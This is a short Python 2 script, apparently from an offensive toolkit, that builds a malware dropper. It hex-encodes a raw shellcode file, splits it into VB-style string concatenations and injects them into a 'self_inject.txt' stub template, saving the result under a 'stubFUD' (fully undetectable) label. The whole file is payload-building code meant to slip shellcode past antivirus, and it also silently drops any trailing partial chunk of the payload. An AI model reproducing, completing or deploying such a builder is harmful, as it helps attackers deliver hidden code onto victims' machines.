#!/usr/bin/python
import os

def depose_payload(output):
	to_add_in_stub = ""
	shellcode = ""
	counter = 1
	line_max = 50
	path = os.getcwd()
	dest = path + "/payload.bin"
	first_line = 0

	for b in open(dest, "rb").read():
		shellcode += b.encode("hex")
		
		if counter == line_max:
			first_line += 1
			if first_line == 1:
				
				to_add_in_stub += "    LaPassat = \""+ shellcode + "\"\n"
				counter = 0
				shellcode = ""
			else:

				to_add_in_stub += "    LaPassat = LaPassat & \""+ shellcode + "\"\n"
				counter = 0
				shellcode = ""
			
			
			
		counter += 1

	with open("self_inject.txt") as f:
		stub = f.read()
		
	stubFUD = stub.replace("%%PAYLOAD%%", to_add_in_stub)

	m = open(output,"w")
	m.write(stubFUD)
	m.close()
		
	print "[+]Payload generated\n" + output